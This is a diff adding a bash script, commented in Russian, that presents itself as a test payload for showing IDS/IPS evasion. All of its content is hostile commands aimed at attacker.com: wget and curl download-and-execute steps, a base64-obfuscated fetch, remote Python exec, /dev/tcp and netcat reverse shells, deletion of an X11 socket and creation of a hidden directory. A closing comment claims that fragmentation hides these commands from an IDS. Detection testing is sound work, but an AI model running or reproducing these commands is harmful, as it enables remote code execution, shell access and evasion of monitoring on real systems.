@@ -1,0 +1,28 @@
+#!/bin/bash
+# Тестовый пейлоад для демонстрации обхода IDS/IPS
+# Этот скрипт содержит сигнатуры, которые обычно обнаруживаются системами защиты
+
+# Команда для загрузки и выполнения скрипта (типичная техника атаки)
+wget http://attacker.com/malicious.sh -O /tmp/payload.sh
+chmod +x /tmp/payload.sh
+/bin/bash /tmp/payload.sh
+
+# Альтернативный способ через curl
+curl -s http://attacker.com/malicious.sh | bash
+
+# Создание обратного соединения (reverse shell)
+/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
+
+# Выполнение команды через base64 (обфускация)
+echo "d2dldCBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQuc2g=" | base64 -d | bash
+
+# Эксплуатация через Python
+python -c "import urllib2; exec(urllib2.urlopen('http://attacker.com/payload.py').read())"
+
+# Дополнительные команды для тестирования обнаружения
+nc -e /bin/bash attacker.com 4444
+rm -f /tmp/.X11-unix/X0
+mkdir -p /var/tmp/.hidden
+
+# Конец пейлоада
+# При фрагментации эти команды разбиваются на части и не обнаруживаются IDS
